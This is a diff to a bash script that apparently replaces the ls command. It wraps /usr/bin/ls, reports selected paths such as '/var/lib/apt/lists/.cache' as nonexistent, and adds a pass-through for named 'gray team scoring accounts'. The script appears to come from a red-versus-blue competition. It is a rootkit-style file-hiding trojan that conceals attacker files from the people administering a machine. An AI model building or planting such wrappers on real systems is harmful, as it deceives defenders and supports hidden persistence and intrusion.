@@ -1,6 +1,12 @@
 #!/bin/bash
 REAL_LS="/usr/bin/ls"
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_LS "$@" ;;
+esac
+
+
 # Paths that are fully blocked — ls on these returns "no such file or directory"
 BLOCKED_PATHS=(
     "/var/lib/apt/lists/.cache"
